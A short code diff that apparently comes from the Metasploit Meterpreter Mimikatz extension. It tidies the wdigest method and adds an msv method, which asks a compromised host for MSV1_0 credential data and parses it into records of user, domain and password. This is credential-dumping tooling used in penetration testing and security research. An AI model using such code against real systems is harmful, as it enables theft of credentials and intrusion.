@@ -33,7 +33,7 @@ class Mimikatz < Extension
 			])
 	end
 
-	def wdigest()
+	def wdigest
 		request = Packet.create_request('mimikatz_wdigest')
 		response = client.send_request(request)
 		result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
@@ -51,8 +51,27 @@ class Mimikatz < Extension
 			accounts << account	
 		end
 		return accounts
-	end	
+	end
+	
+	def msv
+                request = Packet.create_request('mimikatz_msv1_0')
+                response = client.send_request(request)
+                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
 
+                details = CSV.parse(result)
+                accounts  =  []
+                details.each do |acc|
+                        account = {
+                                :authid => acc[0],
+                                :package => acc[1],
+                                :user => acc[2],
+                                :domain => acc[3],
+                                :password => acc[4]
+                        }
+                        accounts << account
+                end
+                return accounts
+	end
 end
 
 end; end; end; end; end
